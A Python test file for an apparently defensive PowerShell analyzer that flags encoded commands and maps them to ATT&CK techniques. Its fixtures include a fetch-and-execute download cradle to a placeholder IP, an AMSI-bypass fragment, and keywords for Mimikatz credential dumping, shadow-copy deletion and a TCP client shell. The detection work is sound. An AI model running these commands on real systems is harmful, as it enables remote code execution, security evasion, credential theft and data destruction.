from conftest import enc
from psunmask.analyzer import analyse
from psunmask.models import Event

CRADLE = "IEX (New-Object Net.WebClient).DownloadString('http://198.51.100.23/a.ps1')"


def run(cmd, parent=""):
    return analyse(Event("test", command_line=cmd, parent_image=parent))


def test_cradle_is_malicious_and_mapped():
    f = run(f"powershell -nop -w hidden -enc {enc(CRADLE)}")
    assert f.verdict == "MALICIOUS"
    assert {"T1059.001", "T1105", "T1564.003"} <= set(f.techniques)
    assert f.iocs["ips"] == ["198.51.100.23"]


def test_admin_command_stays_benign():
    assert run(f"powershell -enc {enc('Get-Service | Select -First 3')}").verdict == "LIKELY_BENIGN"


def test_office_parent_raises_score():
    base = run(f"powershell -enc {enc('whoami')}")
    office = run(f"powershell -enc {enc('whoami')}", "C:\\Office\\WINWORD.EXE")
    assert office.score == base.score + 30 and "T1204.002" in office.techniques


def test_sccm_parent_lowers_score():
    f = run(f"powershell -ep bypass -enc {enc('Get-Date')}", "C:\\Windows\\CCM\\CcmExec.exe")
    assert any("SCCM" in c for c in f.context)


def test_amsi_bypass_detected_deep_in_layers():
    f = run(f"powershell -enc {enc('[Ref].Assembly.GetType(' + chr(39) + 'System.Management.Automation.AmsiUtils' + chr(39) + ')')}")
    assert any(h.rule_id == "PS007" for h in f.hits) and f.verdict in ("SUSPICIOUS", "MALICIOUS")


def test_score_is_capped():
    f = run("Invoke-Mimikatz sekurlsa AmsiUtils vssadmin delete shadows TCPClient Net.Sockets.TCPClient")
    assert f.score == 100
